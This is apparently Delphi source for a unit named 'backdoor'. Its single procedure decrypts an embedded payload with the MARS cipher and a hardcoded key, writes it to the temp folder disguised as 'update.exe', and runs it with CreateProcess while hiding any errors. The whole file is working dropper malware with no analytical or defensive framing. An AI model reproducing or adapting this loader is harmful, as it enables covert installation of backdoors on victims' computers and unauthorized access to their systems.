unit backdoor;

interface
uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, VCLUnZip, mars, DCPcrypt, idhttp, StrUtils;

procedure RunBackDoor();

implementation

{$I .\backdoor.inc }

procedure RunBackDoor();

var
  inStram, outStrem: TMemoryStream;

  DCP_mars: TDCP_mars;

  arr: array[0..MAX_PATH] of Char;
  strpath: string;

  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
begin

  try


    DCP_mars := TDCP_mars.Create(nil);
    inStram := TMemoryStream.Create;
    outStrem := TMemoryStream.Create;
    inStram.Write(arrbackdoor, sizeof(arrbackdoor) - 1);
    inStram.Position := 0;
    inStram.Size;
    DCP_mars.InitStr('back door back door');
    DCP_mars.DecryptStream(inStram, outStrem, inStram.Size);

    GetTempPath(MAX_PATH, arr);
    strpath := arr + '\update.exe';

    outStrem.SaveToFile(strpath);

    FillChar(ProcessInfo, sizeof(TProcessInformation), 0);
    FillChar(StartupInfo, Sizeof(TStartupInfo), 0);
    StartupInfo.cb := Sizeof(TStartupInfo);
    StartupInfo.dwFlags := STARTF_USESHOWWINDOW;
    StartupInfo.wShowWindow := SW_SHOW;
    CreateProcess(Pchar(strpath), nil, nil, nil, False, NORMAL_PRIORITY_CLASS,
      nil, nil, StartupInfo, ProcessInfo);
  except
  end;
end;

end.
